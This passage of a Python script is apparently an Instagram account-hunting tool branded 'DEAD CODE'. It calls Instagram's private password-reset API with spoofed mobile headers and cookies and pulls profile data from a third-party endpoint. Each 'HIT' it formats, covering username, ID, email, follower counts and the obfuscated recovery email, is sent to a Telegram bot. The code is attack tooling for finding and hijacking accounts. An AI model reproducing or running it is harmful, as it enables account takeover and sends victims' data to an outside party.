'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
}
        	          url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
        	          he = {
'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2004; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_EG_#u-nu-arab)',
'Cookie': 'mid=YwsgcAABAAGsRwCKCbYCaUO5xej3; csrftoken=u6c8M4zaneeZBfR5scLVY43lYSIoUhxL',
'Cookie2': '$Version=1',
'Accept-Language': 'ar-EG, en-US',
'X-IG-Connection-Type': 'MOBILE(LTE)',
'X-IG-Capabilities': 'AQ==',
'Accept-Encoding': 'gzip',
}
        	          data = {
"user_id":idd,"device_id":uid,
}
        	          code = requests.post(url,headers=he, data=data).json()
        	          rest = code["obfuscated_email"]
        	          d = f'''꧁𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌꧂
⋘────━𓆩𝐃𝐄𝐀𝐃𓆪‏━────⋙  
✘ > 𝐇𝐈𝐓 : {hit}            
✘ > 𝑰𝑫 : {idd}                
𖠖 > 𝐍𝐀𝐌𝐄 : {NAME}            
𖠖 > 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 : {user} 
𖠖 > 𝐄𝐌𝐀𝐈𝐋 : {email}                
𖠖 > 𝐅𝐎𝐋𝐋𝐎𝐈𝐍𝐆 : {Following}                
𖠖 > 𝐅𝐎𝐋𝐋𝐎𝐄𝐑𝐒 : {Followers}                
𖠖 > 𝐏𝐎𝐒𝐓 : {POSTS}                
𖠖 > 𝐃𝐀𝐓𝐀  : {Data}            
𖠖 >  𝐑𝐄𝐒𝐓 » {rest}                
𖠖 > 𝐋𝐈𝐍𝐊 : https://www.instagram.com/{user}            
⋘────━𓆩𝐃𝐄𝐀𝐃𓆪‏━────⋙ 
𖠖 > 𝐁𝐘 : @S7C_Z - @DEADCODE_22 . '''
        	          print(E+d+'\n')			             
        	          requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={d}")
        	         except:
        	               r = requests.get(f"https://mr-abood.herokuapp.com/Instagram/Info?User={user}").json()
        	               POSTS = r["results"]["Posts"]
        	               Followers = r["results"]["Followers"]
        	               Following = r["results"]["Following"]
        	               idd = r["results"]["id"]
        	               Data = r["results"]["created date"]
        	               d = f'''⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ 𝙳𝙴𝙰𝙳 𝙲𝙾𝙳𝙴 ⌯
•━━━━━━━━━━━━━━━•
⌯ 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 » {user}
⌯ 𝙴𝙼𝙰𝙸𝙻 » {email}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 » {Followers}
⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 » {Following}
⌯ 𝙸𝙳 » {idd}
⌯ 𝙿𝙾𝚂𝚃𝚂 » {POSTS}
⌯ 𝙳𝙰𝚃𝙰 » {Data}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
•━━━━━━━━━━━━━━━•
◔‌◔ ʙʏ » @S7C_Z - @DEADCODE_22 .'''
        	               print(E+d)
        	               requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={d}")
        	               pass
                 elif req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
        	             print(C + " (" + E + "⌯" + C + ") " + M + f' Not Insta ☞ {email} ')
                 else:
        	             print(C + " (" + E + "⌯" + C + ") " + M + f' Not Insta ☞ {email} ')        	             
              elif res.json()['status'] =='USERNAME_UNAVAILABLE':
                     print(C + " (" + E + "⌯" + C + ") " + A +f' BaD Email ☞ {email} ')
              else:
                     print(f"{A} YOUR IP BOCKID ")
                     sys.exit()		    
            else:
                pass                     	       